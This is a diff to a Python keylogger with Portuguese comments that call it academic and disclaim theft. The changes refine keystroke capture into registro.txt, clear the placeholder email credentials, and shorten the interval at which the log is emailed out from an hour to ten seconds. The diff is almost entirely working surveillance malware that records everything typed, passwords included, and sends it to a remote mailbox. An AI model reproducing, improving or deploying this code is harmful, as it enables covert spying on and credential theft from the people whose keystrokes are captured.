@@ -1,5 +1,5 @@
-#atenção, esse código foi criado e comartilhado com intenções acadêmicas
-#não é encorajado usar o código a seguir para roubo de informações de qualquer natureza.
+#atenção, esse código foi criado e compartilhado com intenções acadêmicas
+#não é encorajado usar o código a seguir para roubo de informações.
 
 import time
 import keyboard
@@ -8,16 +8,20 @@ from email.message import EmailMessage
 
 # Captura teclas e salva no arquivo
 def capturar_teclas():
-    evento = keyboard.read_event()
-    tecla = evento.name
-    if evento.event_type == 'down':
+    evento = keyboard.read_event(suppress=False) 
+    if evento.event_type == keyboard.KEY_DOWN:
+        tecla = evento.name
+        if tecla is None:
+            return 
+        if tecla == "space":
+            tecla = " "
+        elif tecla == "enter":
+            tecla = "\n"
+        elif tecla.isdigit(): 
+                tecla = tecla
+        elif len(tecla) > 1:
+            tecla = f"<{tecla}>"
         with open('registro.txt', 'a', encoding='utf-8') as arquivo:
-            if tecla == "space":
-                tecla = " "
-            elif tecla == "enter":
-                tecla = "\n"
-            elif len(tecla) > 1 and tecla != "space":
-                tecla = f"<{tecla}>"
             arquivo.write(tecla)
 
 # Envia um e-mail simples ao iniciar o programa
@@ -50,9 +54,9 @@ def enviar_email():
         servidor.send_message(msg)
 
 # Configurações de e-mail
-remetente = 'email que envia o log'
-senha = 'senha e-mail aqui'  # senha de app
-destinatarios = ['email que vai receber o log']
+remetente = ''
+senha = '' 
+destinatarios = ['']
 
 # Loop principal
 ultimo_envio = time.time()
@@ -60,6 +64,6 @@ enviar_email_check()
 
 while True:
     capturar_teclas()
-    if time.time() - ultimo_envio > 3600: 
+    if time.time() - ultimo_envio > 10:
         enviar_email()
-        ultimo_envio = time.time()
+        ultimo_envio = time.time()   
